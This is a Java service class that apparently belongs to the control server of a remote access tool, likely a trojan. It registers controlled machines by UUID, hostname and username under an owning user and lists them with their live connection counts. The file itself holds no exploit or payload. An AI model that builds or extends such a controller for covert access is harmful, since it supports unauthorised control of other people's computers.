package ovh.wpkg.lskg.services.rat;

import jakarta.inject.Inject;
import jakarta.inject.Singleton;
import jakarta.transaction.Transactional;
import ovh.wpkg.lskg.db.entities.RatInfo;
import ovh.wpkg.lskg.db.entities.User;
import ovh.wpkg.lskg.db.repository.RatInfoRepository;
import ovh.wpkg.lskg.dto.response.RatDTO;
import ovh.wpkg.lskg.server.services.ConnectedRatService;

import java.util.List;
import java.util.UUID;

@Singleton
public class RatInfoService {

    @Inject
    RatInfoRepository ratInfoRepository;

    @Inject
    ConnectedRatService connectedRatService;

    @Transactional
    public void registerRat(User owner, UUID uuid, String hostname, String username) {
        var ratInfo = ratInfoRepository.findByUuid(uuid);

        if (ratInfo.isEmpty()) {
            ratInfoRepository.save(new RatInfo(null, uuid, hostname, username, true, owner, null));
        }
    }

    public List<RatDTO> getRatForUser(User user) {
        var rats = ratInfoRepository.findByUser(user);
        var connectedRats = connectedRatService.getClientList();

        return rats.stream()
                .map((it) -> {
                    var connectedRat = connectedRats.stream()
                            .filter((ratClient -> ratClient.getUuid().equals(it.getUuid())))
                            .findFirst()
                            .orElse(null);

                    return RatDTO.builder()
                            .uuid(it.getUuid())
                            .username(it.getUsername())
                            .hostname(it.getHostname())
                            .connected(connectedRat != null)
                            .connectedAmount(
                                    connectedRat != null ? connectedRat.getSockets().size() : 0
                            )
                            .os("Windows")
                            .arch("x64")
                            .coreVersion("0.0.0")
                            .build();
                }).toList();
    }
}
